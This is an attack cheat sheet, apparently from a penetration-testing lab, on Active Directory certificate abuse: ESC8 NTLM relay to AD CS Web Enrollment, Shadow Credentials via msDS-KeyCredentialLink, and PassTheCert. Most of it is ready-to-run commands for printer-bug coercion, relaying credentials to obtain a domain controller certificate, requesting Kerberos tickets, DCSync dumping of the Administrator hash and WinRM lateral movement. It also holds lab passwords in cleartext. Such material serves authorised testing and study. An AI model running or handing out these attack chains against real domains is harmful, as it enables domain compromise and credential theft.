
# 🔑 Pass-the-Certificate (PKINIT) & ADCS Attacks

## 1. AD CS NTLM Relay Attack (ESC8)

### [!ABSTRACT] Vulnerability Overview

The ESC8 attack exploits Active Directory Certificate Services (AD CS) when HTTP Web Enrollment (`/CertSrv`) is enabled and lacks NTLM relay protections (such as Extended Protection for Authentication or enforced HTTPS). Attackers can coerce a computer account to authenticate to their rogue listener and relay those credentials directly to the AD CS server to request a client authentication certificate.

### [!IMPORTANT] Attack Step 1: Start the NTLM Relay Listener

Fire up `ntlmrelayx` to intercept incoming NTLM credentials and relay them to the AD CS Web Enrollment endpoint.

Bash

```
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

### [!IMPORTANT] Attack Step 2: Coerce Authentication via Printer Bug

Force the remote Domain Controller account to authenticate back to the attack host by exploiting the Print Spooler service.

Bash

```
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

### [!SUCCESS] Attack Step 3: Certificate Generation

Upon successful authentication coercion, `ntlmrelayx` intercepts the computer account request, forwards it to the enrollment server, and drops a base64-encoded PKCS#12 certificate file.

- **Generated File:** `DC01$.pfx`
    

### [!IMPORTANT] Attack Step 4: Request TGT via PKINIT

Use the setup tools inside the `PKINITtools` suite to authenticate to the Key Distribution Center (KDC) using the generated `.pfx` certificate.

Bash

```
# Setup dependencies if necessary
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
pip3 install -I git+https://github.com/wbond/oscrypto.git

# Request Kerberos TGT
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

### [!SUCCESS] Attack Step 5: Execute DCSync to Dump Hashes

Export the generated ticket into your current terminal environment and perform a high-privilege credential dump using the domain controller machine account context.

Bash

```
export KRB5CCNAME=/tmp/dc.ccache

impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

## 2. Shadow Credentials (msDS-KeyCredentialLink)

### [!ABSTRACT] Vulnerability Overview

The Shadow Credentials attack leverages generic write permissions or control delegation over a target object. By writing public key data directly to a victim's `msDS-KeyCredentialLink` attribute, an attacker registers a virtual smart card on the account, allowing authentication via PKINIT without modifying the victim's password.

### [!IMPORTANT] Attack Step 1: Inject Key Credential Link

Use `pywhisker` to generate an X.509 certificate pair and add the public component to the target account's Active Directory properties.

Bash

```
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

- **Output Certificate:** `eFUVVTPf.pfx`
    
- **Output Password:** `bmRH4LK7UwPrAOfvIx6W`
    

### [!IMPORTANT] Attack Step 2: Request TGT for the Compromised Object

Present the newly linked private `.pfx` credential back to the KDC to acquire a regular Kerberos ticket for the impersonated user account.

Bash

```
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

### [!SUCCESS] Attack Step 3: Lateral Movement via WinRM

Verify the ticket configuration cache locally, then execute an authenticated network session into target systems if the account permissions allow.

Bash

```
export KRB5CCNAME=/tmp/jpinkman.ccache

klist

evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

## 3. Alternative Vector: PassTheCert

### [!NOTE] Implementation Context

If the Domain Controller's Key Distribution Center configuration lacks proper Enhanced Key Usage (EKU) parameters to support PKINIT authentication directly, standard TGT ticket requests via certificate will fail. In this case, use **PassTheCert** to authenticate via secure LDAPS channels directly, enabling structural modifications like direct password adjustments or adding access control rights.